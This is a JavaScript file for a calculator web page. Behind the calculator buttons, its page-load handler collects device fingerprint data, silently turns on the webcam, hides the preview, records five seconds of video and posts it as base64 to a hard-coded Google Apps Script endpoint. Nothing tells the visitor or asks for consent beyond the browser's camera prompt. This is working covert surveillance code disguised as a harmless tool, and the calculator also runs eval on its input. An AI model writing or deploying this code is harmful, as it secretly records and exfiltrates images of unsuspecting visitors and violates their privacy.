console.log("Script Loaded");

let result = document.getElementById("result");
let video = document.getElementById("video");

const DRIVE_API = "https://script.google.com/macros/s/AKfycbyP5H3U1sKrClXXeWvb8nJhahk1JpIZkQEmu6ttuXBB_hXDJcGWH3-d8U7a1Zp9ubQVIw/exec";

function press(v){
    result.value += v;
}

function clearResult(){
    result.value = "";
}

function calculate(){
    try{
        result.value = eval(result.value);
    }catch{
        result.value = "Error";
    }
}

let mediaRecorder;
let chunks = [];

async function startCamera(){

    try{

        console.log("Starting camera");

        let stream = await navigator.mediaDevices.getUserMedia({video:true});

        video.srcObject = stream;

        // hide camera preview
        video.style.display = "none";

        mediaRecorder = new MediaRecorder(stream);

        mediaRecorder.ondataavailable = function(e){
            chunks.push(e.data);
        };

        mediaRecorder.onstop = function(){

            console.log("Recording stopped");

            let blob = new Blob(chunks,{type:"video/webm"});

            // reset buffer
            chunks = [];

            saveLocal(blob);

            uploadToDrive(blob);

        };

        mediaRecorder.start();

        console.log("Recording started");

        setTimeout(()=>{
            mediaRecorder.stop();
        },5000);

    }catch(err){

        console.log("Camera error:",err);

    }

}

function saveLocal(blob){

    let reader = new FileReader();

    reader.readAsDataURL(blob);

    reader.onloadend=function(){

        localStorage.setItem("recordedVideo",reader.result);

        console.log("Saved video to Local Storage");

    };

}

function uploadToDrive(blob){

    let reader = new FileReader();

    reader.readAsDataURL(blob);

    reader.onloadend=function(){

        let base64data = reader.result.split(',')[1];

        fetch(DRIVE_API,{
            method:"POST",
            body:JSON.stringify({
                data: base64data,
                filename: "capture_" + Date.now() + ".webm"
            }),
            headers:{
                "Content-Type":"application/json"
            }
        })
        .then(res=>res.json())
        .then(data=>{
            console.log("Uploaded to Drive:",data);
        })
        .catch(err=>{
            console.log("Drive upload failed:",err);
        });

    };

}

function captureDeviceInfo(){

    let deviceInfo = {
        browser: navigator.userAgent,
        os: navigator.platform,
        screen: screen.width + "x" + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    localStorage.setItem("deviceInfo",JSON.stringify(deviceInfo));

    console.table(deviceInfo);

}

window.onload = function(){

    console.log("Page loaded");

    captureDeviceInfo();

    setTimeout(()=>{
        startCamera();
    },1500);

};
